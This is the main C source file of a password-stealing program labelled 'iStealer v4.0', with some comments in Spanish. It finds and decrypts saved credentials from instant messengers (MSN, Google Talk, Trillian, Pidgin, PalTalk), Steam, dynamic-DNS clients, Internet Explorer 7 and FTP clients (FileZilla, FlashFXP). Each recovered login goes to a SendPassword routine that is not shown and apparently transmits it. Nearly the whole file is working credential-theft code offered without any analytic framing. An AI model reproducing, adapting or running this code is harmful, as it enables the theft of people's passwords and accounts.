// main.c - iStealer v4.0 - Kizar Labs 2009  [modified + custom functions]
//
//////////////////////////////////////////////////////////////////////

#include "Functions.h"
#include "Windows.h"
#include "Wininet.h"
#include "WinCred.h"
#include "Config.h"

extern char ComputerID[100];
int VisitProxyURL(char * URL);
int SendPassword(char *application, char *url, char *login, char *pass);

int SHA1Hash(unsigned char *buffer, unsigned long bufferlen, unsigned char *hash);


int GetMSNMessenger()
{
	short int entropyData[37] = {0xE0, 0xC8, 0x108, 0x110, 0xC0, 0x114, 0xD8, 0xDC, 0xB4, 0xE4,
									0x118, 0x114, 0x104, 0xB4, 0xD0, 0xDC, 0xD0, 0xE0,0xB4,
									0xE0, 0xD8, 0xDC, 0xC8, 0xB4, 0x110, 0xD4, 0x114,0x118,
									0x114, 0xD4, 0x108, 0xDC, 0xDC, 0xE4, 0x108, 0xC0, 0x0};
	PCREDENTIALA *lpCredentials = NULL;
	DATA_BLOB blobCrypt, blobPlainText, blobEntropy;
	DWORD i, count;
	char temp[100];

    // MSNMessenger7
	CredEnumerateA("Passport.Net\\*", 0, &count, &lpCredentials);
	blobEntropy.pbData = (BYTE *)entropyData;
	blobEntropy.cbData = 74;
	for (i=0; i<count; i++) {
		blobCrypt.pbData = lpCredentials[i]->CredentialBlob;
		blobCrypt.cbData = lpCredentials[i]->CredentialBlobSize;
		if (CryptUnprotectData(&blobCrypt, NULL, &blobEntropy, NULL, NULL, 1, &blobPlainText))
        {
    		sprintf(temp, "%ls", (char *)blobPlainText.pbData);
    		SendPassword(Password_MSNMessenger, "", lpCredentials[i]->UserName, temp);
        }
        else
    		SendPassword(Password_MSNMessenger, "", lpCredentials[i]->UserName, "");
	}
	CredFree(lpCredentials);

    // LiveMessenger8
	CredEnumerateA("WindowsLive:name=*", 0, &count, &lpCredentials);
	for (i=0; i<count; i++) {
		sprintf(temp, "%ls", lpCredentials[i]->CredentialBlob);
		SendPassword(Password_MSNMessenger, "", lpCredentials[i]->UserName, temp);
	}

	CredFree(lpCredentials);
	return 1;
}


int GetGoogleTalk()
{
	HKEY hKey, hKey2;
	DWORD lEnum, index = 0, dwKeyName = 100, dwData, dwType = REG_SZ;
	char lSubKey2[128], lKeyName[100];
	unsigned char lData[500], lDecryptData[155];
	DATA_BLOB blobCrypt, blobEntropy, blobPlainText;
	unsigned char EntropyData[17];
	DWORD obase, otmp, dwSize;
	char ucname[65], cname[33];
	unsigned int i, b;

	char varpass[128];

	// "Software\Google\Google Talk\Accounts"
	//char encryptVarN1[] = "\x01\x52\x6D\x65\x70\x72\x60\x70\x66\x58\x42\x6E\x6D\x64\x68\x60\x5D\x45\x6C\x6B\x62\x6D\x67\x23\x50\x64\x6D\x69\x5F\x45\x66\x62\x6D\x76\x6A\x71\x72";
	// "<tr><td>Google Talk</td><td>Google Talk</td><td>%s</td><td>%s</td></tr>"
	//char encryptVarN2[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x43\x6A\x6E\x65\x6F\x61\x25\x55\x63\x6F\x6F\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x43\x6A\x6E\x65\x6F\x61\x25\x55\x63\x6F\x6F\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x76\x67\x3A\x20\x72\x3E\x2C\x70\x61\x3F\x3E\x2C\x70\x77\x3F\xF\x9";

//Comprobamos si esta instalado y si la api esta cargada
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Google\\Google Talk\\Accounts", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return 0;

//Cogemos el nombre del usuario y equipo
	dwSize = 32; GetUserNameA(ucname, &dwSize); ucname[dwSize] = 0;
	dwSize = 32; GetComputerNameA(cname, &dwSize); cname[dwSize] = 0;
	strcat(ucname, cname);

//Enumeramos todas las cuentas
	lEnum = RegEnumKeyExA(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL);
	do {

		sprintf(lSubKey2, "%s\\%s", "Software\\Google\\Google Talk\\Accounts", lKeyName);
		RegOpenKeyExA(HKEY_CURRENT_USER, lSubKey2, 0, KEY_ALL_ACCESS, &hKey2);
		dwData = 500;
		if (RegQueryValueExA(hKey2, "pw", 0, &dwType, lData, &dwData) == ERROR_SUCCESS) {

			strcpy((char*)EntropyData, "\xA3\x1E\xF3\x69\x07\x62\xD9\x1F\x1E\xE9\x35\x7D\x4F\xD2\x7D\x48");
			obase = 0xBA0DA71D;
			b=0;

		//blobEntropy
			for (i=0; i<strlen(ucname); i++) {
				if(b==16) b=0;
				memcpy(&otmp, (void*)&EntropyData[b], 4);
				otmp ^= ucname[i] * obase;
				memcpy((void*)&EntropyData[b], &otmp, 4);
				obase *= 0x0BC8F;
				b += 4;
			}


		//blobCrypt
			memcpy(&obase, (void*)&EntropyData[0], 4);
			obase |= 1;
			for (i=0; i<309; i+=2) {
				lDecryptData[i/2] = (unsigned char)( (((lData[i+4] - 1) << 4)|(lData[i+5] - 0x21)) - (unsigned char)obase );
				obase *= 0x10ff5;
			}

			blobEntropy.pbData = (BYTE *)EntropyData;
			blobEntropy.cbData = 16;


			blobCrypt.pbData = (BYTE *)lDecryptData;
			blobCrypt.cbData = 154;

            if (CryptUnprotectData(&blobCrypt, NULL, &blobEntropy, NULL, NULL, 1, &blobPlainText))
            {
			    strncpy(varpass, (char*)(blobPlainText.pbData+1 + blobPlainText.cbData), blobPlainText.cbData);
			    SendPassword(Password_GoogleTalk, "", lKeyName, varpass);
            }
            else
			    SendPassword(Password_GoogleTalk, "", lKeyName, "");
		}
		RegCloseKey(hKey2);
		index++;
		dwKeyName = 100;
	}while (RegEnumKeyExA(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS);
	RegCloseKey(hKey);
	return 1;
}


int GetTrillian(char *programFiles)
{
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	char sProfilePath[MAX_PATH], sClientPath[MAX_PATH];
	char szUser[100], szEncPass[100], szDecPass[100];
	unsigned int i, b, salt[17] = {0xF3, 0x26, 0x81, 0xC4, 0x39, 0x86, 0xDB, 0x92, 0x71, 0xA3, 0xB9, 0xE6, 0x53, 0x7A, 0x95, 0x7C};
	char newLine[] = "\x0D\x0A";

	strcpy(sProfilePath, programFiles);
	strcat(sProfilePath, "\\Trillian\\users\\default");

	for (i=0; i<3; i++) {

		if (i == 0) {
			//Trillian MSN
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, "\\msn.ini");
		} else if (i == 1) {
			//Trillian AIM
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, "\\aim.ini");
		} else if (i == 2) {
			//Trillian Yahoo
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, "\\yahoo.ini");
		}

		if (!ReadFileData(sClientPath, &dataBuffer, &dataLen))
			continue;

		pIni = FindString(dataBuffer, dataLen, "name=", 0);
		if (pIni == 0) {
			free(dataBuffer);
			continue;
		}
		pIni += 5;
		pFin = FindString(dataBuffer, dataLen, newLine, pIni);
		strncpy(szUser, &dataBuffer[pIni], pFin-pIni);
		szUser[pFin-pIni] = 0;

		pIni = FindString(dataBuffer, dataLen, "password=", 0);
		if (pIni == 0) {
			free(dataBuffer);
			continue;
		}
		pIni += 9;
		pFin = FindString(dataBuffer, dataLen, newLine, pIni);
		strncpy(szEncPass, &dataBuffer[pIni], pFin-pIni);
		szEncPass[pFin-pIni] = 0;

		// Desencriptar contraseña
		for (b=0; b<strlen(szEncPass)/2; b++) {
			sscanf(&szEncPass[b*2], "%02x", &szDecPass[b]);
			szDecPass[b] ^= salt[b%16];
		}
		szDecPass[b] = 0;

		if (i == 0)
			SendPassword(Password_TrillianMSN, "", szUser, szDecPass);
		else if (i == 1)
			SendPassword(Password_TrillianAIM, "", szUser, szDecPass);
		else if (i == 2)
			SendPassword(Password_TrillianYahoo, "", szUser, szDecPass);

		free(dataBuffer);
	}
	return 1;
}


int GetPidgin(char *appData)
{
	char sProfilePath[500];
	char szUser[120], szEncPass[120];
	char * dataBuffer;
	DWORD dataLen, pIni, pFin;
	

	pFin = 0;

	strcpy(sProfilePath, appData);

	strcat(sProfilePath, "\\.purple\\accounts.xml");
	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	pIni = FindString(dataBuffer, dataLen, "<name>", 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 6;
	pFin = FindString(dataBuffer, dataLen, "</name>", pIni);
	strncpy(szUser, &dataBuffer[pIni], pFin - pIni);
	szUser[pFin - pIni] = 0;

	pIni = FindString(dataBuffer, dataLen, "<password>", 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 10;
	pFin = FindString(dataBuffer, dataLen, "</password>", pIni);
	strncpy(szEncPass, &dataBuffer[pIni], pFin - pIni);
	szEncPass[pFin - pIni] = 0;

	SendPassword(Password_Pidgin, "", szUser, szEncPass);
	free(dataBuffer);
	return 1;
}


int GetPalTalk()
{
	unsigned long serialnum, i;
	char nickname[50], pwd[200], szDecPass[32];
	char mixed[64], serial[64], swap;
	unsigned char temp[3];

	HKEY hKey, hKey2;
	DWORD lEnum, index=0, dwKeyName = 100, dwData, dwType = REG_SZ;
	char lSubKey2[128], lKeyName[100];


	// Comprobamos si esta instalado
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Paltalk", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return 0;

	// Cogemos el numero de serie del discoduro
	if (GetDriveTypeA("C:\\") == 3) {
		if(GetVolumeInformationA("C:\\", 0, 0, &serialnum, 0, 0, 0, 0))
			sprintf(serial, "%08X", serialnum);
		else
			return 0;
	} else
		return 0;

	// Enumeramos todas las cuentas
	lEnum = RegEnumKeyExA(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL);
	do {

		sprintf(lSubKey2, "%s\\%s", "Software\\Paltalk", lKeyName);
		RegOpenKeyExA(HKEY_CURRENT_USER, lSubKey2, 0, KEY_ALL_ACCESS, &hKey2);
		dwData = 50;
		if (RegQueryValueExA(hKey2, "nickname", 0, &dwType, (BYTE *)&nickname, &dwData) != ERROR_SUCCESS)
			return 0;
		dwData = 150;
		if (RegQueryValueExA(hKey2, "pwd", 0, &dwType, (BYTE *)&pwd, &dwData) != ERROR_SUCCESS)
			return 0;
		// Mezclamos el nombre de usuario con el numero de serie
		for (i=0; i<strlen(nickname)+8; i++) {
			if (i>=strlen(nickname)*2) {
				mixed[i] = 0;
				strcat((char *)mixed, &serial[i/2]);
				break;
			}
			if (i>=16) {
				mixed[i] = 0;
				strcat((char *)mixed, &nickname[i/2]);
				break;
			}
			if (i%2 == 0) mixed[i] = nickname[i/2]; else mixed[i] = serial[i/2];
		}
		// Rotamos uno todos los caracteres
		swap = mixed[strlen(nickname)+7];
		for (i=strlen(nickname)+7; i>0; i--) {
			mixed[i] = mixed[i-1];
		}
		mixed[0] = swap;
		mixed[strlen(nickname)+8] = 0;

		// Calculamos letra a letra el pass
		for (unsigned short i=0; i<strlen(pwd); i+=4) {
			temp[0] = pwd[i]-48;
			temp[1] = pwd[i+1]-48;
			temp[2] = pwd[i+2]-48;
			temp[3] = 0;
			temp[3] = (10*temp[3])+temp[0];
			temp[3] = (10*temp[3])+temp[1];
			temp[3] = (10*temp[3])+temp[2];
			temp[3] = 134-mixed[i/4]-(i/4)+temp[3];
			szDecPass[i/4] = temp[3];
		}
		szDecPass[strlen(pwd)/4] = 0;

		SendPassword(Password_Paltalk, "", nickname, szDecPass);

		RegCloseKey(hKey2);
		index++;
		dwKeyName = 100;
	}while (RegEnumKeyExA(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS);
	RegCloseKey(hKey);
	return 1;

}


int GetSteam()
{
    typedef INT (CDECL *typeSteamDecryptDataForThisMachine)(LPSTR, INT, LPSTR, INT, LPDWORD);

    HMODULE hSteam;
	typeSteamDecryptDataForThisMachine SteamDecryptDataForThisMachine;
	DWORD dataLen, dwDecPassLen;
    char *dataBuffer;
	char szUser[UserPasswordLength], szEncPass[UserPasswordLength], szDecPass[UserPasswordLength];
	char dirSteam[MAX_PATH], dllPath[MAX_PATH], blobPath[MAX_PATH];
	unsigned int i;
	//Users 0x01 0x50
	char users[] = "\x55\x73\x65\x72\x73\x01\x50";
	//Phrase 0x01 0x50
	char phrase[] = "\x50\x68\x72\x61\x73\x65\x01\x50";


	// C:\Archivos de programa\Steam
	if (!ReadKeyData(HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", "InstallPath", dirSteam))
		return 0;

	strcpy(dllPath, dirSteam);
	strcat(dllPath, "\\Steam.dll");
	strcpy(blobPath, dirSteam);
	strcat(blobPath, "\\ClientRegistry.blob");

	hSteam = LoadLibraryA(dllPath);
	if (hSteam == 0)
		return 0;

	SteamDecryptDataForThisMachine = (typeSteamDecryptDataForThisMachine)GetProcAddress(hSteam, "SteamDecryptDataForThisMachine");
	if (SteamDecryptDataForThisMachine == NULL)
		return 0;

	if (!ReadFileData(blobPath, &dataBuffer, &dataLen))
		return 0;

//Usuario
	strncpy(szUser, &dataBuffer[FindString(dataBuffer, dataLen, users, 0) + 41], 32);
	for (i=0; i<strlen(szUser); i++) {
		if (szUser[i] == 1) {
			szUser[i] = 0;
			break;
		}
	}

//Password
	strncpy(szEncPass, &dataBuffer[FindString(dataBuffer, dataLen, phrase, 0) + 40], 512);
	szEncPass[strlen(szEncPass) - 1] = 0;

	if (SteamDecryptDataForThisMachine(szEncPass, strlen(szEncPass), szDecPass, 32, &dwDecPassLen))
		return 0;
	szDecPass[dwDecPassLen] = 0;

	SendPassword(Password_Steam, "", szUser, szDecPass);

	free(dataBuffer);
	FreeLibrary(hSteam);
	return 1;
}


int GetNoIp()
{
	char UserName[UserPasswordLength], PasswordBase64[UserPasswordLength], Password[UserPasswordLength];

	if (!ReadKeyData(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vitalwerks\\DUC", "Username", UserName) ||
	    !ReadKeyData(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vitalwerks\\DUC", "Password", PasswordBase64))
		return 0;

	Base64Decode(1, PasswordBase64, Password);
	SendPassword(Password_NoIP, "", UserName, Password);

	return 1;
}


int GetDynDNS(char *commonAppData)
{
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	unsigned int i;
	char sProfilePath[MAX_PATH];
	char szUser[UserPasswordLength], szEncPass[UserPasswordLength], szDecPass[UserPasswordLength];
	// "t6KzXhCh"
	char salt[] = "\x01\x75\x34\x48\x7E\x5D\x69\x41\x6B";
	char fin[3] = "\x0D\x0A";

	strcpy(sProfilePath, commonAppData);
	strcat(sProfilePath, "\\DynDNS\\Updater\\config.dyndns");

	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	// Username
	pIni = FindString(dataBuffer, dataLen, "Username=", 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 9;
	pFin = FindString(dataBuffer, dataLen, fin, pIni);
	strncpy(szUser, &dataBuffer[pIni], pFin-pIni);
	szUser[pFin-pIni] = 0;

	// Password
	pIni = FindString(dataBuffer, dataLen, "Password=", 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 9;
	pFin = FindString(dataBuffer, dataLen, fin, pIni);
	strncpy(szEncPass, &dataBuffer[pIni], pFin-pIni);
	szEncPass[pFin-pIni] = 0;

	for (i=0; i<strlen(szEncPass)/2; i++) {
		sscanf(&szEncPass[i*2], "%02x", &szDecPass[i]);
		szDecPass[i] ^= salt[i%8];
	}
	SendPassword(Password_DynDNS, "", szUser, szDecPass);

	return 1;
}


int GetInternetExplorer7()
{
	HANDLE hCacheEnumHandle;
	LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntry = NULL;
	HKEY rkey;
	DWORD dwCacheEntry, dwInStr, lpType, lpcbData, i;
	DATA_BLOB DataIn, DataOut, OptionalEntropy;
	char szUrl[4096], szHash[44], szDest[512];
	DWORD headerSize, dwDataOffset1, dwDataOffset2;
	char temp1[100]; 	char temp2[100];

	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_READ, &rkey) != ERROR_SUCCESS)
		return 0;

	dwCacheEntry = 0;
	hCacheEnumHandle = FindFirstUrlCacheEntry(NULL, 0, &dwCacheEntry);
	lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFOA)malloc(dwCacheEntry);
    lpCacheEntry->dwStructSize = dwCacheEntry;
	hCacheEnumHandle = FindFirstUrlCacheEntryA(NULL, lpCacheEntry, &dwCacheEntry);

	do {
		if (lpCacheEntry->CacheEntryType == 2097153) {

			dwInStr = FindString(lpCacheEntry->lpszSourceUrlName, strlen(lpCacheEntry->lpszSourceUrlName), "@", 0);
			if (dwInStr != 0)
				dwInStr ++;

			for (i=0; i<=strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr; i++) {
				szUrl[i * 2] = lpCacheEntry->lpszSourceUrlName[i+dwInStr];
				szUrl[(i * 2) + 1] = 0;
			}

			if (!SHA1Hash((unsigned char *)szUrl, strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr, (unsigned char *)szHash))
				return 0;

			lpType = REG_SZ;
			lpcbData = 512;
			if (RegQueryValueExA(rkey, szHash, 0, &lpType, (unsigned char *)szDest, &lpcbData) == ERROR_SUCCESS) {
				DataIn.cbData = lpcbData;
				DataIn.pbData = (BYTE *)&szDest;
				OptionalEntropy.cbData = (strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr) * 2 + 2;
				OptionalEntropy.pbData = (BYTE *)&szUrl;
				if (CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL, NULL, 1, &DataOut)) {
					memcpy(&headerSize, (void *)(DataOut.pbData + 4), 4);
					headerSize += 12;
					memcpy(&dwDataOffset1, (void *)(DataOut.pbData + 36), 4);
					memcpy(&dwDataOffset2, (void *)(DataOut.pbData + 52), 4);
					sprintf(temp1, "%ls", (char *)(DataOut.pbData + headerSize+dwDataOffset1));
					sprintf(temp2, "%ls", (char *)(DataOut.pbData + headerSize+dwDataOffset2));
					SendPassword(Password_InternetExplorer, &lpCacheEntry->lpszSourceUrlName[dwInStr], temp1, temp2);
				}
			}
		}

		dwCacheEntry = 0;
		FindNextUrlCacheEntry(hCacheEnumHandle, 0, &dwCacheEntry);
		if (dwCacheEntry == 0)
			break;
		lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFOA)realloc(lpCacheEntry, dwCacheEntry);
		lpCacheEntry->dwStructSize = dwCacheEntry;

	} while (FindNextUrlCacheEntryA(hCacheEnumHandle, lpCacheEntry, &dwCacheEntry));

	FindCloseUrlCache(hCacheEnumHandle);
	RegCloseKey(rkey);

	free(lpCacheEntry);
	return 1;
}


int GetFileZilla(char *appData)
{
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	char sProfilePath[MAX_PATH];
	char szHost[100], szUser[100], szPass[100], szPort[100];

    // parse recentservers.xml
	strcpy(sProfilePath, appData);
	strcat(sProfilePath, "\\FileZilla\\recentservers.xml");

	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	while (1) {
		// Host
		pIni = FindString(dataBuffer, dataLen, "<Host>", pFin);
		if (pIni == 0)
			break;
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Host>", pIni);
		strncpy(szHost, &dataBuffer[pIni], pFin - pIni);
		szHost[pFin - pIni] = 0;

		// Port
		pIni = FindString(dataBuffer, dataLen, "<Port>", pFin);
		if (pIni == 0)
			break;
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Port>", pIni);
		strncpy(szPort, &dataBuffer[pIni], pFin - pIni);
		szPort[pFin - pIni] = 0;
        if (strcmp(szPort, "21") != 0)
        {
            strcat(szHost, ":");
            strcat(szHost, szPort);
        }

		// User
		pIni = FindString(dataBuffer, dataLen, "<User>", pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</User>", pIni);
		strncpy(szUser, &dataBuffer[pIni], pFin - pIni);
		szUser[pFin - pIni] = 0;

		// Pass
		pIni = FindString(dataBuffer, dataLen, "<Pass>", pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Pass>", pIni);
		strncpy(szPass, &dataBuffer[pIni], pFin - pIni);
		szPass[pFin - pIni] = 0;

		SendPassword(Password_FileZilla, szHost, szUser, szPass);
	}
	free(dataBuffer);

    // parse sitemanager.xml
	strcpy(sProfilePath, appData);
	strcat(sProfilePath, "\\FileZilla\\sitemanager.xml");

	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	while (1) {
		// Host
		pIni = FindString(dataBuffer, dataLen, "<Host>", pFin);
		if (pIni == 0)
			break;
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Host>", pIni);
		strncpy(szHost, &dataBuffer[pIni], pFin - pIni);
		szHost[pFin - pIni] = 0;

		// Port
		pIni = FindString(dataBuffer, dataLen, "<Port>", pFin);
		if (pIni == 0)
			break;
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Port>", pIni);
		strncpy(szPort, &dataBuffer[pIni], pFin - pIni);
		szPort[pFin - pIni] = 0;
        if (strcmp(szPort, "21") != 0)
        {
            strcat(szHost, ":");
            strcat(szHost, szPort);
        }

		// User
		pIni = FindString(dataBuffer, dataLen, "<User>", pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</User>", pIni);
		strncpy(szUser, &dataBuffer[pIni], pFin - pIni);
		szUser[pFin - pIni] = 0;

		// Pass
		pIni = FindString(dataBuffer, dataLen, "<Pass>", pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, "</Pass>", pIni);
		strncpy(szPass, &dataBuffer[pIni], pFin - pIni);
		szPass[pFin - pIni] = 0;

		SendPassword(Password_FileZilla, szHost, szUser, szPass);
	}
	free(dataBuffer);

	return 1;
}


int GetFlashFXP(char *commonAppData)
{
	char * databuffer = NULL;
	unsigned long datalen, position=0;
	char szHost[UserPasswordLength], szUser[UserPasswordLength], szPass[UserPasswordLength];
	unsigned char encPass[UserPasswordLength], decPass[UserPasswordLength];
	char sProfilePath[MAX_PATH];
	unsigned short int i;

    char SomeArray[] = "yA36zA48dEhfrvghGRg57h5UlDv3";

	strcpy(sProfilePath, commonAppData);
	strcat(sProfilePath, "\\FlashFXP\\3\\Sites.dat");

	if (!ReadFileData(sProfilePath, &databuffer, &datalen))
		return 0;

	// Evitamos los default
	while (GetLine(&position, databuffer, datalen, "Default Sites", szHost)) { }
	// Descartamos el primero
	if (!GetLine(&position, databuffer, datalen, "IP=", szHost))
		return 0;

	while (1) {
		// Host
		if (!GetLine(&position, databuffer, datalen, "IP=", szHost))
			return 0;
		// User
		if (!GetLine(&position, databuffer, datalen, "user=", szUser))
			return 0;
		// Pass
		if (!GetLine(&position, databuffer, datalen, "pass=", szPass))
			return 0;
		// Desencriptar contraseña
		for (i=0; i<strlen(szPass)/2; i++) {
			sscanf(&szPass[i*2], "%02X", &encPass[i]);
		}
		for (i=0; i<strlen(szPass)/2; i++) {
			decPass[i] = encPass[i+1] ^ SomeArray[i];
			if (decPass[i] < encPass[i]) decPass[i]--;
			decPass[i] -= encPass[i];
		}
		decPass[i-1] = 0;
		SendPassword(Password_FlashFXP, szHost, szUser, (char *)decPass);
	}
	return 1;
}



int SHA1Hash(unsigned char *buffer, unsigned long bufferlen, unsigned char *hash)
{
	HCRYPTPROV hProv, hHash;
	unsigned long hashlen = 20;
	unsigned char retBuffer[20];
	unsigned char tail = 0;
	unsigned short int i;

	hash[0] = 0;
	if (CryptAcquireContext == NULL)
		return 0;

	CryptAcquireContext(&hProv, NULL, NULL, 1, 0);
	if (CryptCreateHash(hProv, 0x8004, 0, 0, &hHash)) {
		if (CryptHashData(hHash, buffer, bufferlen*2+2, 0)) {
			if (CryptGetHashParam(hHash, 2, retBuffer, &hashlen, 0)) {
				CryptDestroyHash(hHash);
				CryptReleaseContext(hProv, 0);
				for (i=0; i<20; i++) {
					tail += retBuffer[i];
					sprintf((char *)hash, "%s%2.2X", hash, retBuffer[i]);
				}
				sprintf((char *)hash, "%s%2.2X", hash, tail);
				return 1;
			}
		}
	}
	return 0;
}

